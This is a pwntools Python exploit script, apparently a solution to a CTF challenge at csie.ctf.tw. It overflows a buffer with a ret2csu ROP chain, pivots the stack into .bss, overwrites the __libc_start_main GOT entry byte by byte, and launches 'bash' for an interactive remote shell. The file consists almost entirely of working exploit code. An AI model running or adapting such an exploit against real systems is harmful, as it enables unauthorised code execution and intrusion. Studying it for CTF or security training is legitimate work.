from pwn import *

#offset = 0x443d0 - 0x20950
offset = 0x24970

read_got = 0x601000
libc_start_got = 0x601008
pop_rbp_ret = 0x400512
mov_rdx_rsi_edi_call = 0x4005d0
pop_rbp_ret = 0x400512
leave_ret = 0x400576
buf1 = 0x601e00
buf2 = 0x601b00
ret = 0x400417

#r = remote('0.0.0.0',4000)
#r = remote('127.0.0.1',8888)
r = remote('csie.ctf.tw', 10142)

#raw_input('pause')

rop1 = [
   0x4005e6,
   0x0, # padding
   0x0, # rbx
   0x1, # rbp
   read_got,#0x40007ffe88, #r12
   0x0, #r13
   buf1-1, #r14
   0x200, #r15
   0x4005d0, # mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12 + rbx*8]
   0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
   pop_rbp_ret, buf1-8 , leave_ret
]
len_rop1 = len(rop1)

rop2 = [
   pop_rbp_ret, # ret
   0x1,
   0x4005e6,
   0x0, # padding
   0x0, # rbx
   0x1, # rbp
   buf1,#0x40007ffe88, #r12
   0x0, #r13
   0x0, #r14
   offset & 0xff, #r15 # TODO rdx 
   0x4005d0, # mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12 + rbx*8]
   pop_rbp_ret, libc_start_got - 0x48,
   0x400527, # add byte ptr[rbp + 0x48], dl ; mov ebp, esp ; je 0x400557 ; mov eax, 0 ; test rax, rax ; je 0x400557 ; pop rbp ; mov edi, 0x600e48 ; jmp rax

   0x0, # padding
   0x4005e6,
   0x0, # padding
   0x0, # rbx
   0x1, # rbp
   buf1,#0x40007ffe88, #r12
   0x0, #r13
   0x0, #r14
   (offset>>8) & 0xff, #r15 # TODO rdx 
   0x4005d0, # mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12 + rbx*8]
   pop_rbp_ret, libc_start_got - 0x47,
   0x400527, # add byte ptr[rbp + 0x48], dl ; mov ebp, esp ; je 0x400557 ; mov eax, 0 ; test rax, rax ; je 0x400557 ; pop rbp ; mov edi, 0x600e48 ; jmp rax

   0x0, #padding
   0x4005e6,
   0x0, # padding
   0x0, # rbx
   0x1, # rbp
   buf1,#0x40007ffe88, #r12
   0x0, #r13
   0x0, #r14
   (offset>>16) & 0xff, #r15 # TODO rdx 
   0x4005d0, # mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12 + rbx*8]
   pop_rbp_ret, libc_start_got - 0x46,
   0x400527, # add byte ptr[rbp + 0x48], dl ; mov ebp, esp ; je 0x400557 ; mov eax, 0 ; test rax, rax ; je 0x400557 ; pop rbp ; mov edi, 0x600e48 ; jmp rax
   
   0x0, # padding
   0x4005e6,
   0x0, # padding
   0x0, # rbx
   0x1, # rbp
   libc_start_got,#0x40007ffe88, #r12
   buf1+500, #r13
   0x0, #r14
   0x0, #r15 # TODO rdx 
   0x4005d0 # mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12 + rbx*8]
]

r.send(('A'*24 + ''.join(map(p64,rop1))).ljust(256,'A') + '\n')
r.send((''.join(map(p64,rop2))+'deadbeaf').ljust(500,'A') + 'bash' + ' '*100 + '\n')
#r.send('A'*24 + ''.join(map(p64,rop1)) + '\n')


r.interactive()
